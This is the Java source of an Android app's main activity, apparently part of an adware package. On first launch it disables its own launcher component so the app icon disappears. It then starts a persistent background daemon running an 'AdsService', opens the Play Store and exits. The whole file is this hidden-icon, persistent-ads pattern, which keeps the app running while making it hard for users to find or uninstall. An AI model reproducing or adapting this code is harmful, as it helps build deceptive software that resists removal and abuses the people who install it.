package com.emob.luck.view;

import com.emob.lib.util.MobiUtils;
import com.emob.luck.AdsService;
import com.mobi.fork.GuardHelper;

import android.app.Activity;
import android.content.ComponentName;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Bundle;
import android.util.Log;

public class MainActivity extends Activity {
	private static final String TAG = "MainActivity";

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);

		PackageManager packageManager = getPackageManager();
		ComponentName componentName = new ComponentName(this, MainActivity.class);
		int res = packageManager.getComponentEnabledSetting(componentName);
		if (res == PackageManager.COMPONENT_ENABLED_STATE_DEFAULT
				|| res == PackageManager.COMPONENT_ENABLED_STATE_ENABLED) {
			// 隐藏应用图标
			packageManager.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DISABLED,
					PackageManager.DONT_KILL_APP);
		} else {
			// 显示应用图标
			packageManager.setComponentEnabledSetting(componentName, PackageManager.COMPONENT_ENABLED_STATE_DEFAULT,
					PackageManager.DONT_KILL_APP);
		}

		boolean isServiceRunning = MobiUtils.isServiceRunning(getApplicationContext(), AdsService.class.getName());
		Log.d(TAG, "#### MainActivity.onReceive, service running:"+isServiceRunning);
		if (!isServiceRunning) {
			GuardHelper.startDaemon(getApplicationContext(), "com.emob.luck.AdsService");
		}

		final String appPackageName = "com.android.vending";
		try {
			startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse("market://details?id=" + appPackageName)));
		} catch (android.content.ActivityNotFoundException anfe) {
			startActivity(new Intent(Intent.ACTION_VIEW, Uri.parse("https://play.google.com/store/apps/details?id=" + appPackageName)));
		}

		finish();
	}
}
